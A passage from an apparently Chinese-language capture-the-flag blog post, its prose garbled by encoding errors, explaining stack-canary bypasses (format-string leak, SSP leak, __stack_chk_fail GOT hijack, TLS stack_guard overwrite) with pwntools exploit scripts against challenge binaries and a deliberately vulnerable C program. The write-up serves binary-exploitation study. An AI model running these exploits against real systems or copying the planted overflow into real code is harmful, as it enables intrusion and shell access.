(0xffffffffffffff00)#æœ«å°¾æ¸…0ä»¥ä¿æŒä¸ç¨‹åºå†…éƒ¨çš„å­—èŠ‚å¯¹é½log.success(&#39;canary:%x \n&#39;,canary)payload = b&#39;a&#39; * 40 + p64(canary)  + p64(0)+ b&#39;\x42&#39;#p64(0)å°†æ ˆä¸Šçš„è¿”å›åœ°å€æ›¿æ¢ä¸º0ï¼Œä»è€Œç»•è¿‡å†…å­˜ä¿æŠ¤æœºåˆ¶sh.send(payload)sh.interactive()</code></pre><h4 id="ä¸‰ã€åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²è·å–canary"><a href="#ä¸‰ã€åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²è·å–canary" class="headerlink" title="ä¸‰ã€åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²è·å–canary"></a><strong>ä¸‰ã€åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²è·å–canary</strong></h4><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²å¯ä»¥æ‰“å°å‡ºæ ˆä¸­å†…å®¹ï¼Œç›®æ ‡åˆ©ç”¨æ­¤æ¼æ´æ‰“å°å‡ºcanaryå€¼ï¼Œå†åˆ©ç”¨æº¢å‡ºè¿›è¡Œæ”»å‡».<br>ã€Mary_Mortonã€‘<br>ï¼ˆ1ï¼‰checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628202654542.png" alt="image-20230628202654542"></p><p>ï¼ˆ2ï¼‰IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204047171.png" alt="image-20230628204047171"></p><p>å¿«ä¹<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204121367.png" alt="image-20230628204121367"></p><p> è®¡ç®—åç§»å–½<br>                                      <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204702697.png" alt="image-20230628204702697"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204720325.png" alt="image-20230628204720325"></p><p>bufä¸canaryè·ç¦» 0x90 - 0x8 &#x3D; 0x88(136)   2^8+1 &#x3D; 17ä¸ªå†…å­˜å•å…ƒ<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628210551449.png" alt="image-20230628210551449"></p><p>canaryä¸printfæ ¼å¼åŒ–å­—ç¬¦ä¸²å½¢å‚ç›¸å¯¹åç§»ä¸º17+6 &#x3D; 23<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628210759817.png" alt="image-20230628210759817"></p><p>expï¼š</p><pre><code class="python">from pwn import*context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;) #p=process(&#39;./mary&#39;)p=remote(&quot;61.147.171.105&quot;,63174) p.sendlineafter(&quot;battle \n&quot;,&quot;2&quot;)p.sendline(&quot;%23$p&quot;)tmp=int(p.recv(),16)canary=p64(tmp) payload=b&quot;a&quot;*(0x88)+canary+p64(0)+p64(0x4008DA) p.sendlineafter(&quot;3.&quot;,&quot;1&quot;) p.sendline(payload)p.interactive()</code></pre><h4 id="å››ã€SSP-Leakåˆ©ç”¨canary"><a href="#å››ã€SSP-Leakåˆ©ç”¨canary" class="headerlink" title="å››ã€SSP Leakåˆ©ç”¨canary"></a><strong>å››ã€SSP Leakåˆ©ç”¨canary</strong></h4><p>æ€è·¯ï¼š<br>$canaryæ£€æµ‹å¤±è´¥ä¼šè§¦å‘stack_chk_faliå‡½æ•°é€ æˆstack smashingï¼ˆstack smashing protect leakï¼‰<br>$stack_chk_failå‡½æ•°ä¼šè¾“å‡ºä¸€æ®µæŠ¥é”™æ˜¾ç¤ºæ–‡ä»¶åï¼Œè¦†ç›–æ–‡ä»¶åæŒ‡é’ˆï¼Œä»è€Œå®ç°ä»»æ„è¯»ä¹Ÿå°±æ˜¯è¦†ç›–å˜é‡__libc_argv[0]<br>$åˆ©ç”¨ç›¸åº”å‡½æ•°è¿›è¡Œæº¢å‡ºï¼ˆputsã€readã€writeï¼‰å¾—åˆ°libcbase å¾—å‡ºå…³é”®åœ°å€è¿›è¡Œæ”»å‡»</p><pre><code class="c">void __attribute__ ((noreturn)) __stack_chk_fail (void)&#123;  __fortify_fail (&quot;stack smashing detected&quot;);&#125;void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)&#123;  /* The loop is added only to keep gcc happy.  */  while (1)    __libc_message (2, &quot;*** %s ***: %s terminatedn&quot;,                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);&#125;</code></pre><p>è¦†ç›–åˆ°argvå°±å¯è¾“å‡ºæˆ‘ä»¬æƒ³è¦çš„å‚æ•°ï¼ˆå³åˆ©ç”¨äº†canaryçš„æŠ¥é”™ä¿¡æ¯ï¼‰</p><p>ä¸åŒçš„libcå¯¹äº__fortify_failå®ç°æœ‰å·®å¼‚ï¼Œä¸‹é¢æ˜¯glibcçš„å®ç°<br><a href="https://github.com/lattera/glibc/blob/895ef79e04a953cac1493863bcae29ad85657ee1/debug/fortify_fail.c">githubæºç ï¼šglibc&#x2F;debug&#x2F;fortify_fail.c</a><br>ã€2018ç½‘é¼æ¯ Guessã€‘<br>(1)checsksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628135719174.png" alt="image-20230628135719174"></p><p>(2)IDAåˆ†æ<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628142542077.png" alt="image-20230628142542077"></p><p>ï¼ˆ3ï¼‰åˆ©ç”¨stack samshingåŸç† gdbè°ƒè¯•æ‰¾åˆ°argv[0]è®¡ç®—åç§»<br>é€šè¿‡è¦†ç›–libc_argv[0]çš„å†…å®¹è§¦å‘canaryä¿æŠ¤å°†è¦†ç›–å†…å®¹è¿›è¡Œè¾“å‡º<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628143124351.png" alt="image-20230628143124351"></p><p>åœ¨mainå‡½æ•°ä½ç½®ä¸‹æ–­ç‚¹ rsiå¤„ä¸ºargv[0]åœ°å€(0x7fffffffdfc87)<br>libcä¸­æœ‰ä¸€ä¸ªå˜é‡environï¼Œå‚¨å­˜ç€æ ˆåœ°å€ åªè¦å¾—åˆ°libcåŸºå€ï¼Œå°±å¯ä»¥ç®—å‡ºè¿™ä¸ªå˜é‡çš„åœ°å€ï¼Œå†æ¬¡ç”¨__stack_chk_failè¯»å–è¿™ä¸ªå˜é‡å°±å¯ä»¥å¾—åˆ°æ ˆçš„ä¸€ä¸ªåœ°å€ï¼Œå°±èƒ½è®¡ç®—å‡ºè¯»è¿›æ¥çš„flagçš„åœ°å€ï¼Œä»è€Œå†æ¬¡ç”¨stack smashè¯»å–flag</p><p>ç¬¬ä¸€æ¬¡ï¼Œæˆ‘ä»¬æ³„éœ²å‡½æ•°çš„gotè¡¨å†…å®¹ï¼Œå¾—åˆ°glibcåœ°å€ã€‚å¾—åˆ°glibcåœ°å€ï¼Œæ˜¯ä¸ºäº†è®¡ç®—å‡ºstack_endå˜é‡çš„åœ°å€ï¼Œè¿›è€Œï¼Œç¬¬äºŒæ¬¡ï¼Œæˆ‘ä»¬æ³„éœ²æ ˆåœ°å€ï¼Œè®¡ç®—å‡ºflagå­˜æ”¾çš„åœ°å€ï¼Œäºæ˜¯ï¼Œç¬¬ä¸‰æ¬¡ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ³„éœ²flagçš„å€¼ã€‚</p><p>getså‡½æ•°ä¸‹æ–­ç‚¹  è°ƒè¯•è®¡ç®—åç§»0xfc8-0xea0ï¼ˆ0x128ï¼‰ã€è¿˜éœ€è¿›ä¸€æ­¥æ·±å…¥ç†è§£ã€‘</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628161126662.png" alt="image-20230628161126662"></p><p>expï¼š</p><pre><code class="python">from pwn import *from LibcSearcher import *context.log_level = &#39;debug&#39;elf = ELF(&#39;./GUESS&#39;)# libc = ELF(&#39;./libc-2.23.so&#39;)io = remote(&#39;node4.buuoj.cn&#39;,27922)# io = process(&#39;./GUESS&#39;)puts_got = elf.got[&#39;puts&#39;]def leak_addr(content):    io.recvline()    io.sendline(content)    io.recvuntil(&#39;*** stack smashing detected ***: &#39;)    addr = u64(io.recv(6).ljust(8,b&#39;\x00&#39;))    return addr# step1: leak puts_addrpayload1 = b&#39;a&#39;*0x128+p64(puts_got)puts_plt = leak_addr(payload1)print(&quot;puts_plt-----&gt;&quot; + hex(puts_plt))libc = LibcSearcher(&quot;puts&quot;,puts_plt)libc_base = puts_plt - libc.dump(&quot;puts&quot;)print(&quot;libc_base-----&gt;&quot; + hex(libc_base))environ = libc.dump(&#39;__environ&#39;) + libc_base# step2: leak environpayload2 = b&#39;a&#39;*0x128 + p64(environ)environ_addr = leak_addr(payload2)print(&quot;enviorn in stack-----&gt;&quot; + hex(environ_addr))# step3: leak flagpayload3 = b&#39;a&#39;*0x128 + p64(environ_addr-0x168)io.sendlineafter(&#39;Please type your guessing flag\n&#39;,payload3)print(io.recvline())</code></pre><h4 id="äº”ã€åŠ«æŒstack-chk-failå‡½æ•°æ³„éœ²canary"><a href="#äº”ã€åŠ«æŒstack-chk-failå‡½æ•°æ³„éœ²canary" class="headerlink" title="äº”ã€åŠ«æŒstack_chk_failå‡½æ•°æ³„éœ²canary"></a>äº”ã€åŠ«æŒstack_chk_failå‡½æ•°æ³„éœ²canary</h4><p>æ€è·¯ï¼šåŠ«æŒstack_chk_failï¼Œå¯ä»¥ä¿®æ”¹å…¨å±€åç§»è¡¨(GOT)ä¸­å­˜å‚¨çš„_stack_chk_failå‡½æ•°åœ°å€ï¼Œåœ¨è§¦å‘canaryæ£€æŸ¥å¤±è´¥æ—¶ï¼Œè·³è½¬åˆ°æŒ‡å®šçš„åœ°å€ç»§ç»­æ‰§è¡Œ.</p><p>ç™¾åº¦æ¯flagenå…¶å®å¯ä»¥åšæ›´å¥½çš„æ —å­ ç›®å‰æš‚æœªè·å–åˆ°ç›¸å…³æ–‡ä»¶ ä»¥åæœ‰æœºä¼šå¡«å‘ğŸ˜Š</p><p>æœ‰ç›¸å…³æ–‡ç« [(12æ¡æ¶ˆæ¯) [pwn]ROPï¼šä¸‰é“é¢˜è®²è§£èŠ±å¼ç»•è¿‡Canaryæ ˆä¿æŠ¤_breezeO_oçš„åšå®¢-CSDNåšå®¢](<a href="https://blog.csdn.net/Breeze_CAT/article/details/100086513?ops_request_misc=%7B%22request_id%22:%22168796009416800197015252%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168796009416800197015252&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-100086513-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=%E7%99%BE%E5%BA%A6%E6%9D%AF">https://blog.csdn.net/Breeze_CAT/article/details/100086513?ops_request_misc=%7B%22request%5Fid%22%3A%22168796009416800197015252%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=168796009416800197015252&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-100086513-null-null.142^v88^control_2,239^v2^insert_chatgpt&amp;utm_term=ç™¾åº¦æ¯</a> flagen&amp;spm&#x3D;1018.2226.3001.4187)</p><p>è‡ªå·±æ•´ä¸ªå°ç®€å•ğŸ¤–<br><strong>æ¼æ´ä»£ç </strong></p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;void shell(void)&#123;    system(&quot;/bin/sh&quot;);&#125;int main(int argc, char *argv[])&#123;    setbuf(stdin, NULL);    setbuf(stdout, NULL);    setbuf(stderr, NULL);    char buf[175];    read(0, buf, 275);#æ ˆæº¢å‡º    printf(buf);    return 0;&#125;</code></pre><p>è¦æƒ³æˆåŠŸåŠ«æŒå‡½æ•°ä¿®æ”¹gotè¡¨ éœ€å…³é—­relro<br>è°ƒç”¨shellå‡½æ•°éœ€è¦å…³é—­pie</p><pre><code>gcc a.c -m32 -fstack-protector -no-pie -z noexecstack -z norelro -o a</code></pre><p>expï¼š</p><pre><code class="python">from pwn import *import timecontext(os=&#39;linux&#39;, arch=&#39;i386&#39;, log_level=&#39;debug&#39;)sh=process(&#39;a&#39;)offset=10scf_got=ELF(&#39;a&#39;).got[&#39;__stack_chk_fail&#39;]gs_addr=ELF(&#39;a&#39;).sym[&#39;getshell&#39;]exp=fmtstr_payload(offset, &#123;scf_got: gs_addr&#125;)sh.send(exp+&#39;A&#39;*100)sh.interactive()</code></pre><p>ä¹ä¹ä¹<br>æ‰¾åˆ°æ–‡ä»¶äº†<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/%601%7D0$_NRN19IS]ZZA9EK_PE.jpg" alt="img"><br>ã€flagenã€‘<br>gotè¡¨è¦†å†™åŸç†<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628224746293.png" alt="image-20230628224746293"><br>ï¼ˆ1ï¼‰checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628215919448.png" alt="image-20230628215919448"></p><p>ï¼ˆ2ï¼‰IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628220716478.png" alt="image-20230628220716478"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628220912579.png" alt="image-20230628220912579"></p><p>æ­¤éƒ¨åˆ†ä¼šå°†è¾“å…¥éƒ¨åˆ†å˜é•¿ï¼ˆ1ä¸ªå­—èŠ‚å˜æˆ3ä¸ªå­—èŠ‚ï¼‰ï¼Œå…¶ä¸­destä¸ºæŒ‡å‘å †ç¼“å†²åŒºçš„æŒ‡é’ˆï¼Œåœ¨è°ƒç”¨leetify()æ—¶ï¼Œå…¶å€¼å°†è¢«å‹å…¥æ ˆä¸­ï¼Œç”±äºè¯¥å‡½æ•°å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´è¦†ç›–æ‰destçš„å€¼ä¸ºæŒ‡å®šåœ°å€ï¼Œåœ¨åç»­è°ƒç”¨strcpy()æ—¶ï¼Œå®ç°å‘ä»»æ„åœ°å€å†™çš„ç›®çš„ã€‚<br>æˆ‘ä»¬å¯ä»¥å°†destè¦†ç›–ä¸ºstack_chk_failå‡½æ•°åœ¨gotè¡¨ä¸­çš„åœ°å€ï¼Œè¾¾åˆ°ä¿®æ”¹stack_chk_failå‡½æ•°è°ƒç”¨åœ°å€çš„ç›®çš„ï¼Œè¿™æ ·åç»­åœ¨è°ƒç”¨è¯¥å‡½æ•°æ—¶ï¼Œå®é™…ä¸Šæ‰§è¡Œçš„æ˜¯æ”»å‡»è€…çš„ä»£ç ã€‚åˆå› ä¸ºcanaryå­˜åœ¨\x00æˆªæ–­ï¼Œéœ€å¯»æ‰¾åˆé€‚çš„å‡½æ•°è¿›è¡Œè¾“å…¥.</p><p>è¿˜æ˜¯é€šè¿‡æ³„éœ²libcbase getshell</p><pre><code class="python">libc=LibcSearcher(&#39;alarm&#39;,alarm)system=alarm-libc.dump(&#39;alarm&#39;)+libc.dump(&#39;system&#39;)malloc_hook=alarm-libc.dump(&#39;alarm&#39;)+libc.dump(&#39;__malloc_hook&#39;)print(&#39;malloc_hook&#39;,hex(malloc_hook))p.sendline(&#39;/bin/sh\x00&#39;)p.sendline(p32(system))</code></pre><p>expï¼š</p><pre><code class="python">from pwn import *from LibcSearcher import *context.log_level=&#39;debug&#39;#context.terminal=[&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;sh&#39;,&#39;-c&#39;]elf=ELF(&#39;./flagen&#39;)def input(p,input):    p.sendlineafter(&#39;: &#39;,&#39;1&#39;)    p.sendline(input)def up(p):    p.sendlineafter(&#39;: &#39;,&#39;2&#39;)def low(p):    p.sendlineafter(&#39;: &#39;,&#39;3&#39;)def change(p):    p.sendlineafter(&#39;: &#39;,&#39;4&#39;)def addprefix(p):    p.sendlineafter(&#39;: &#39;,&#39;5&#39;)def prin(p):    p.sendlineafter(&#39;: &#39;,&#39;6&#39;)def exit(p):    p.sendlineafter(&#39;: &#39;,&#39;7&#39;)puts=0x08048510ret=0x0804846astack_check=0x0804B01Cpop_1=0x08048481pop_2=0x08048b00pop_3=0x08048d8dbss=0x804b144+0x8a=0x08048F60read=0x080486CBp=process(&#39;./flagen&#39;)payload=p32(ret)+b&#39;h&#39;*0x55+&#39;a&#39;*8+b&#39;a&#39;*5+p32(pop_1)+p32(stack_check)payload+=p32(puts)+p32(pop_1)+p32(elf.got[&#39;free&#39;])payload+=p32(read)+p32(pop_3)+p32(bss+0x100)+p32(0x6fffffff)+p32(0xffffffff)payload+=p32(read)+p32(pop_3)+p32(elf.got[&#39;free&#39;])+p32(0x6fffffff)+p32(0xffffffff)payload+=p32(elf.plt[&#39;free&#39;])+p32(pop_1)+p32(bss+0x100)input(p,payload)change(p)alarm=u32(p.recv()[4:8].ljust(4,&#39;\x00&#39;))libc=LibcSearcher(&#39;alarm&#39;,alarm)system=alarm-libc.dump(&#39;alarm&#39;)+libc.dump(&#39;system&#39;)malloc_hook=alarm-libc.dump(&#39;alarm&#39;)+libc.dump(&#39;__malloc_hook&#39;)print(&#39;malloc_hook&#39;,hex(malloc_hook))p.sendline(&#39;/bin/sh\x00&#39;)p.sendline(p32(system))p.interactive()p.close()</code></pre><h4 id="å…­ã€ä¿®æ”¹TSLç»•è¿‡canary"><a href="#å…­ã€ä¿®æ”¹TSLç»•è¿‡canary" class="headerlink" title="å…­ã€ä¿®æ”¹TSLç»•è¿‡canary"></a>å…­ã€ä¿®æ”¹TSLç»•è¿‡canary</h4><p>åœ¨linuxä¸‹æœ‰ä¸€ç§çº¿ç¨‹å±€éƒ¨å­˜å‚¨ï¼ˆTread Local Storageï¼‰æœºåˆ¶ï¼Œå³TLS.<br>å­˜å‚¨çº¿ç¨‹çš„ä¸€äº›å…¨å±€å˜é‡.<br>ç»“æ„ï¼š</p><pre><code class="c">typedef struct  &#123;    void *tcb;        /* Pointer to the TCB.  Not necessarily the                 thread descriptor used by libpthread.  */    dtv_t *dtv;    void *self;       /* Pointer to the thread descriptor.  */    int multiple_threads;    int gscope_flag;    uintptr_t sysinfo;    uintptr_t stack_guard;    uintptr_t pointer_guard;    ...  &#125; tcbhead_t;  </code></pre><p>æ³¨æ„ï¼šç»“æ„ä¸­uintptr_t stack_guardå°±æ˜¯canaryå€¼ï¼Œåˆ©ç”¨æ¼æ´ç¯¡æ”¹stack_guardå€¼å³å¯ç»•è¿‡canaryï¼Œè€Œgsæˆ–fså¯„å­˜å™¨æŒ‡å‘æ­¤ç»“æ„.</p><p>ã€bfnoteã€‘</p><p>ï¼ˆ1ï¼‰checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628102341433.png" alt="image-20230628102341433"></p><p>ï¼ˆ2ï¼‰è¿›IDA<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628105142174.png" alt="image-20230628105142174"></p><p>æ¼æ´ï¼šã€1ã€‘sæº¢å‡º0x600<br>           ã€2ã€‘v4è¿›è¡Œåˆå§‹åŒ–ï¼Œæ£€æµ‹é™åˆ¶äº†è¾“å…¥é•¿åº¦ï¼Œè€Œåˆ©ç”¨æ—¶å¹¶éåˆ©ç”¨äº†æ£€æµ‹å®Œæˆçš„å€¼ï¼Œåˆ©ç”¨äº†æ£€æµ‹å‰çš„å€¼ï¼Œä½¿å¾—æˆ‘ä»¬æ‹¥æœ‰ä¸€æ¬¡åœ¨ä»»æ„åœ°å€å†™å…¥é•¿åº¦çš„èƒ½åŠ›<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628110303853.png" alt="image-20230628110303853"></p><p>gså¯„å­˜å™¨æŒ‡å‘çš„ä½ç½®å®é™…ä¸Šå°±æ˜¯å†…å­˜ä¸­æŸå¤„çš„tcbhead_tï¼Œè€Œåé¢çš„0x14æŒ‡çš„æ˜¯stack_guardç›¸å¯¹çš„åç§»ï¼Œé‚£ä¹ˆtcbhead_tåˆ°åº•å­˜å‚¨åœ¨å“ªï¼Œæ¯ä¸ªlibcä¸åŒï¼Œä½†æ˜¯å¯¹äºpwné¢˜ç»å¸¸ä½¿ç”¨çš„libæ¥è¯´ï¼Œå…¶åˆ†å¸ƒåŸºæœ¬å¦‚å›¾æ‰€ç¤º<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628111024934.png" alt="image-20230628111024934"></p><p>åœ¨libcåœ°å€æ›´ä¸‹ä½ç½®å’Œmmapä¸€æ ·åŒå±å…±äº«æ˜ å°„åŒºåŸŸï¼Œåç§»ç›¸å¯¹å›ºå®š.å½“æˆ‘ä»¬mallocä¸€ä¸ªç›¸å½“å¤§çš„ç©ºé—´ï¼ˆæ­¤é¢˜&gt;&#x3D;0x20000ï¼‰ï¼Œmallodå°±ä¼šç”¨mmapæ¥åˆ†é…å†…å­˜ç©ºé—´ï¼Œå…¶åˆ†é…ä½ç½®ä¹Ÿä¼šä½äºå…±äº«æ˜ å°„åŒºåŸŸï¼Œä¾æ®mmapæœºåˆ¶ï¼Œå…¶æ°å¥½å¤„äºtcbhead_råœ°å€çš„ä½åœ°å€å¤„ï¼Œæ­¤æ—¶åˆ©ç”¨ç¬¬äºŒä¸ªæ¼æ´å†™å…¥å¯ä¿®æ”¹canaryçš„å€¼ï¼Œä»è€Œå®ç°ç»•è¿‡.<a href="https://blog.csdn.net/wmq880204/article/details/115163244?ops_request_misc=%7B%22request_id%22:%22168792272416800213048166%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168792272416800213048166&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-115163244-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=mmap=%E5%88%86%E9%85%8D%E6%9C%BA%E5%88%B6&spm=1018.2226.3001.4187">(12æ¡æ¶ˆæ¯) Linuxç³»ç»Ÿmmapå†…å­˜æ˜ å°„æœºåˆ¶åŸç†_seqiqi_è è-çªçªçš„åšå®¢-CSDNåšå®¢</a></p><p>ï¼ˆ3ï¼‰ret2dl-resolveæœºåˆ¶åˆ©ç”¨ï¼ˆå»¶è¿Ÿç»‘å®šåº”ç”¨ï¼‰<br>åˆ©ç”¨çš„ä¸¤ç§ç»“æ„<em>Symï¼ˆx86ä¸ºElf32_Sym x64ä¸ºElf64_Symï¼‰</em>ã€<em>Relï¼ˆx86ä¸ºElf32_Rel x64ä¸ºElf64_Relï¼‰</em></p><p>SymåŸºæœ¬ç»“æ„</p><pre><code class="c">typedef struct&#123;  Elf32_Word    st_name; //ç¬¦å·åï¼Œæ˜¯ç›¸å¯¹.dynstrèµ·å§‹çš„åç§»ï¼ˆ4å­—èŠ‚ï¼‰  Elf32_Addr    st_value;ã€€ã€€//(4å­—èŠ‚)  Elf32_Word    st_size;ã€€ã€€//(4å­—èŠ‚)  unsigned char st_info; //å¯¹äºå¯¼å…¥å‡½æ•°ç¬¦å·è€Œè¨€ï¼Œå®ƒæ˜¯0x12(1å­—èŠ‚)  unsigned char st_other;ã€€ã€€//(1å­—èŠ‚)  Elf32_Section st_shndx;ã€€ã€€// (2å­—èŠ‚)&#125;Elf32_Sym; //å¯¹äºå¯¼å…¥å‡½æ•°ç¬¦å·è€Œè¨€ï¼Œå…¶ä»–å­—æ®µéƒ½æ˜¯0</code></pre><pre><code class="c">struct Elf64_Sym&#123;  Elf64_Word    st_name;   //ç¬¦å·åï¼Œæ˜¯ç›¸å¯¹.dynstrèµ·å§‹çš„åç§»(4å­—èŠ‚ï¼‰  unsigned char st_info;   //å¯¹äºå¯¼å…¥å‡½æ•°ç¬¦å·è€Œè¨€ï¼Œå®ƒæ˜¯0x12(1å­—èŠ‚)  unsigned char st_other;  //(1å­—èŠ‚)  Elf64_Section st_shndx;  //(2å­—èŠ‚ï¼‰  Elf64_Addr    st_value;  //(8å­—èŠ‚)  Elf64_Xword   st_size;   //(8å­—èŠ‚)&#125;;//å¯¹äºå¯¼å…¥å‡½æ•°è€Œè¨€ï¼Œå…¶ä»–å­—æ®µéƒ½æ˜¯0</code></pre><p>RelåŸºæœ¬ç»“æ„</p><pre><code class="c">typedef struct &#123;    Elf32_Addr        r_offset;//æ˜¯gotçš„å¯¹åº”çš„åœ°å€(4å­—èŠ‚)    Elf32_Word       r_info; //(4å­—èŠ‚),å…¶ä¸­æœ€ä½å­—èŠ‚åº”è¯¥ä¸º0x7ï¼Œå‰ä¸‰ä¸ªå­—èŠ‚å½“åšä¸€ä¸ªæ•°å­—ï¼Œæ˜¯ç›¸å¯¹.dynsymèµ·å§‹çš„åç§»çš„ä¸‹æ ‡(å³åç§»è¿˜éœ€è¦é™¤ä»¥0x10)&#125; Elf32_Rel;</code></pre><pre><code class="c">typedef struct &#123;    Elf64_Xword    r_offset;   //æ˜¯gotçš„å¯¹åº”çš„åœ°å€(8å­—èŠ‚)    Elf64_Xword    r_info;     //(8å­—èŠ‚),å…¶ä¸­æœ€ä½å­—èŠ‚åº”è¯¥ä¸º0x7,å‰ä¸‰ä¸ªå­—èŠ‚å½“åšä¸€ä¸ªã€€ã€€ Elf64_Sxword r_addend; ã€€ã€€//(8å­—èŠ‚) &#125; Elf64_Rel;</code></pre><p><u>ä¸€èˆ¬x64é€‰æ‹©gadgetè¿›è¡Œæ”»å‡» æ­¤é¢˜ä¹Ÿä¸º32ä½ æ•…ä»¥ä¸‹è¯¦ç»†ä»‹ç»32ä½ä½¿ç”¨ret2dl-resolveæ”»å‡»æ–¹æ³•</u><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628115713705.png" alt="image-20230628115713705"></p><p>32ä½å»¶è¿Ÿç»‘å®šå…·ä½“æµç¨‹<br>*ç¬¬ä¸€ä¸ªpushçš„å€¼å®é™…ä¸Šæ˜¯å¯¹åº”çš„Relå’Œ.dynrelçš„ç›¸å¯¹åç§»<br> *jmpè·³è½¬åˆ°ç¬¬ä¸€ä¸ªç¬¬ä¸€ä¸ªpushåç§»å¯¹åº”çš„Relç»“æ„ï¼Œå–å‡ºé‡Œé¢çš„infoä¸­åŒ…å«çš„symç»“æ„çš„ä¸‹æ ‡ï¼Œæ‰¾åˆ°å¯¹åº”çš„symä¸­çš„å­—ç¬¦ä¸²çš„åœ°å€ï¼Œä»è€Œè§£æåˆ°è¿™ä¸ªåç§°ä¸ºè¯¥å­—ç¬¦ä¸²çš„å‡½æ•°ï¼Œå°†å…¶åœ°å€å†™å…¥relç¬¬ä¸€é¡¹çš„åœ°å€ä¸­ã€‚æ­¤æ—¶ï¼Œå°†æ ˆæ¸…ç©ºåˆ°ä¸€å¼€å§‹pushçš„ä¸¤ä¸ªå€¼ä¹‹å‰ï¼Œä»è€Œæ­£å¸¸æ‰§è¡Œå¯¹åº”çš„å­—ç¬¦ä¸²çš„å‡½æ•°å³å¯ã€‚</p><p>æˆ‘ä»¬çš„ret2dl-resolveå®é™…ä¸Šè®¾ç½®ä¸º.got.plt<a href="%E4%B9%9F%E5%B0%B1%E6%98%AF%E5%9B%BE%E4%B8%AD%E7%9A%840x8048450">0</a>å¯¹åº”çš„åœ°å€å³å¯ï¼Œä»è€Œä»–è§£æå®Œæˆåä¼šç»§ç»­æŒ‰ç…§ç»™å®šçš„å‚æ•°æ‰§è¡Œã€‚<br><em>tip</em><br>ä¸­é—´çš„ç©ºç™½ï¼Œä½œä¸ºgapï¼Œæ˜¯å› ä¸ºæ‰§è¡Œçš„æ—¶å€™æœ€åæœ‰æ ˆåœ°å€çš„å˜åŒ–ï¼Œè‹¥æ— gapä½œä¸ºé˜»éš”ï¼Œå¯èƒ½æ ˆçš„å˜åŒ–ä¼šè¦†ç›–æ‰ä¸€äº›é‡è¦çš„æ•°æ®ï¼Œä»è€Œå¯¼è‡´ç¨‹åºå´©æºƒï¼Œæ‰€ä»¥éœ€è¦ç•™æœ‰ä¸€å®šçš„gapä½œä¸ºæ ˆç©ºé—´å˜åŒ–çš„gap</p><p>ï¼ˆ4ï¼‰æ¼æ´åˆ©ç”¨<br>è§‚å¯Ÿä¸»å‡½æ•°å‘ç°ä¸€å…±è¿›è¡Œäº†ä¸‰æ¬¡è¾“å…¥ï¼š<br>ã€1ã€‘ä¿®æ”¹canaryã€æœ€ç»ˆçš„è¿”å›åœ°å€åŠæ ˆåœ°å€ï¼ˆå¯çœ‹æ±‡ç¼–ï¼‰<br>ã€2ã€‘ä¼ªé€ äº†ä¸€ä¸ªshellcode<br>ã€3ã€‘ä½¿ç”¨TSLï¼Œç»•è¿‡canary</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628134309027.png" alt="image-20230628134309027"></p><p>expï¼š</p><pre><code class="python">from pwn import *r = remote(&quot;node4.buuoj.cn&quot;, 25009)#r = process(&quot;./bfnote&quot;)elf = ELF(&quot;./bfnote&quot;)#libc = ELF(&#39;./lib/i386-linux-gnu/libc.so.6&#39;)bss_start = 0x0804A060gap = 0x500stack_overflow = b&#39;a&#39; * (0x3e - 0xc + 0x8) + p64(bss_start + gap + 0x4) r.recvuntil(&#39;Give your description : &#39;)r.send(stack_overflow)r.recvuntil(&#39;Give your postscript : &#39;)fake_sym = p32(bss_start + gap + 0x4 * 4 + 0x8 - 0x80482C8) + p32(0) + p32(0) + p32(0x12)fake_rel = p32(bss_start) + p32(0x7 + int((bss_start + gap + 0x4 * 4 + 0x8 